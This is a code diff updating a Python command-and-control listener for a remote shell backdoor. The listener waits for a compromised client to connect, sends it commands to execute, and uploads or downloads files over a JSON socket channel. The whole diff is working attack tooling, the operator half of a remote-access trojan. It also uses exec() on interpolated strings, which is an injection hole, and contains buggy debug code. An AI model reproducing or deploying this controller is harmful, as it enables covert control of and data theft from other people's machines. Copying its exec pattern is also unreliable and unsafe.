@@ -12,35 +12,52 @@ import json
 import os
 import socket
 import sys
+import time
+import traceback
+from threading import Thread
 from typing import Union, Any
 
 # - Für das nächste Update
-BUFFERSIZE = 1024
-PROMPT = '[@]$~Shell~$> '
-OUTSTYLE_PLUS = '[+] '
-OUTSTYLE_MINUS = '[-] '
-OUTSTYLE_STAR = '[*] '
+BUFFERSIZE: int = 1024
+PROMPT: str = '[@]$~Shell~$> '
 
 
-def display(text: Union[str, bytes, Any], style=None, prompt: str = PROMPT, flush=False, end='\\n'):
+class DisplayOutstyle(object):
+    OUTSTYLE_PLUS: str = '[+] '
+    OUTSTYLE_MINUS: str = '[-] '
+    OUTSTYLE_STAR: str = '[*] '
+    OUTSTYLE_RESULT: str = ''
+
+
+# ## ### --- -- - comes in util module - -- --- ### ## ## #
+def display(text: Union[str, bytes, Any], style: str = None, prompt: str = PROMPT, sep: str = ' ', end: str = '\\n',
+            flush: bool = False):
     """
     Helper func to Display text output in the console
     :param str text:    Output text for the Display
-    :param str prompt:  Normal the const PROMPT, but also possibility to do a change
     :param str style:   One of the Output const from OUTSTYLE--GOOD-BAD-WONDER, otherwise will display the Prompt
-    :param flush:       flush Parameter from Pythons print function, if you need it somewhere other as the default
+    :param str prompt:  Normal the const PROMPT, but also possibility to do a change
+    :param bool flush:  Flush Parameter from Pythons print function, if you need it somewhere other as the default
+    :param str sep:     Separator between the python print input args
     :param str end:     end Parameter from Pythons print function, if you need it somewhere other as the default
     """
     if isinstance(text, bytes):
-        text = text.decode('utf-8')
+        text = text.decode()
     else:
         text = str(text)
     if style:
-        exec(f"""print('{style}{text}',flush='{flush}', end='{end}')""")
+        exec('''print(style, text, sep='{}', end='{}', flush='{}')'''.format(sep, end, flush))
+        # exec(f"""print('{style}{text}',sep='{sep}', end='{end}',flush='{flush}')""")
     else:
-        exec(f"""print('{prompt}{text}',flush='{flush}', end='{end}')""")
+        exec('''print(prompt, text, sep='{}', end='{}', flush='{}')'''.format(sep, end, flush))
+        # exec(f"""print('{prompt}{text}',sep='{sep}',end='{end}',flush='{flush}')""")
+
+
+# ## ### --- -- - comes in util module -END- - -- --- ### ## ## #
 
 class Listener(object):
+    """Simple Alpha Version, for Multiple Clients every Listener Class will Thread as Parent and a name for selector"""
+
     def __init__(self, ip: str = '127.0.0.1', port: int = 26262):
         try:
             super(Listener, self).__init__()
@@ -48,13 +65,19 @@ class Listener(object):
             self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.listener.bind((ip, port))
             self.listener.listen(0)
-            display('Waiting for connections', style=OUTSTYLE_PLUS)
+            display('Waiting for connections', style=DisplayOutstyle.OUTSTYLE_PLUS)
             self.connection, addr = self.listener.accept()
-            display('Connection from {addr[0]} established', style=OUTSTYLE_PLUS)
+            display(f'Connection from {addr[0]} established', style=DisplayOutstyle.OUTSTYLE_PLUS)
+        except KeyboardInterrupt:
+            # - One Display for ^c, if someone has better code, pls pls send to me I use and post it :-(
+            display('', style=DisplayOutstyle.OUTSTYLE_RESULT, prompt=' ')
+            display('[CTRL] + [C] Pressed Shutting down...', style=DisplayOutstyle.OUTSTYLE_STAR, flush=True)
+            sys.exit()
         except Exception as err:
-            display('Error while trying to get a connection from client: {0}'.format(err.__str__()), style=OUTSTYLE_MINUS)
+            display('Error while trying to get a connection from client: {0}'.format(err.__str__()),
+                    style=DisplayOutstyle.OUTSTYLE_MINUS)
 
-    # ## ### --- -- - Network handling area - --- ### ## #
+    # ## ### --- -- - Network handling area - -- --- ### ## ## #
     def reliable_send(self, data: Any) -> None:
         json_data = json.dumps(data)
         self.connection.send(json_data.encode())
@@ -66,10 +89,14 @@ class Listener(object):
             raw_data += packet
             if len(packet) < BUFFERSIZE:
                 break
+        print(raw_data)
+        if raw_data == '' or raw_data is None:
+            # - By empty Transmission, return nothing and dont not serialization
+            return 'reliable_receive error, nothing received'
         return json.loads(raw_data.decode())
 
-    # ## ### --- -- - handling reading and writing files - --- ### ## #
-    def read_file(self, filename: Union[str, bytes, os.PathLike.__class__(), os.PathLike]) -> bytes:
+    # ## ### --- -- - handling reading and writing files - -- --- ### ## ## #
+    def read_file(self, filename) -> bytes:
         try:
             with open(filename, 'rb') as file:
                 return base64.b64encode(file.read())
@@ -80,11 +107,11 @@ class Listener(object):
         try:
             with open(filename, 'wb') as file:
                 file.write(base64.b64decode(content))
-            return f'{OUTSTYLE_PLUS} The File {filename} successfully written into {os.getcwd()}.'
+            return f'{DisplayOutstyle.OUTSTYLE_PLUS} The File {filename} successfully written into {os.getcwd()}.'
         except OSError:
             return 'OSError'
 
-    # ## ### --- -- - generally handling commands to remote and back - --- ### ## #
+    # ## ### --- -- - generally handling commands to remote and back - -- --- ### ## ## #
     def execute_remotely(self, command: list) -> Any:
         self.reliable_send(command)
         if command[0] == 'exit':
@@ -93,18 +120,17 @@ class Listener(object):
 
         return self.reliable_receive()
 
-    # ## ### --- -- - main loop into wrapper in order to exceptions dont crash application - --- ### ## #
-    def __exception_wrapper(self):
+    # ## ### --- -- - main loop into wrapper in order to exceptions dont crash application - -- --- ### ## ## #
+    def __runtime_wrapper(self):
         # - take a list off strings as cmd-message, so that is easy to select needed variable
-        command: list[str] = input(PROMPT).split(' ')
-        # - ask
+        command: list[str] = input(PROMPT).strip().split(' ')
 
         # If upload from local to remote
         if command[0] == 'upload' and len(command) > 1:
             if os.path.exists(command[1]):
                 # - if local file without whitespaces is exist then read and send
-                file_content = self.read_file(command[1])
-                # - add file to command list
+                file_content = self.read_file(command[1]).decode()
+                # - add file to command list, org. variant.. on update I think about a better
                 command.append(file_content)
             else:
                 # bau: eine funktion die leerzeichen zählt dann kann alles nach upload zusammengesetzt werden aber immer mit leerzeichen obs geht ka sonst google
@@ -117,7 +143,7 @@ class Listener(object):
                     command.append(file_content)
                 else:
                     # - local file cant be located, print and do nothing
-                    display('Cant locate local file, please check your Input', style=OUTSTYLE_MINUS)
+                    display('Cant locate local file, please check your Input', style=DisplayOutstyle.OUTSTYLE_MINUS)
 
         # - send command list to remote executing
         result = self.execute_remotely(command)
@@ -131,20 +157,23 @@ class Listener(object):
             result = self.write_file(command[1].strip(' '), result)
 
         # - output the generally result from client or errormessage from any kind of
-        display(text='{0}'.format(result))
+        display(text=result, prompt=DisplayOutstyle.OUTSTYLE_RESULT)
 
     def run(self):
         while True:
             try:
                 # - Main Prompt Execution comes into a Wrapper cause off order
-                self.__exception_wrapper()
+                self.__runtime_wrapper()
             except KeyboardInterrupt:
                 if input('Quit Program Y/N').upper().startswith('Y'):
+                    self.connection.close()
                     break
                 else:
                     continue
             except Exception:
-                display('Error in Main-Command Prompt loop', style=OUTSTYLE_MINUS)
+                display('Error in Main-Command Prompt loop', style=DisplayOutstyle.OUTSTYLE_MINUS)
+                # - debug
+                display(f'{traceback.format_exc()}')
 
 
 ccc_handler = Listener()
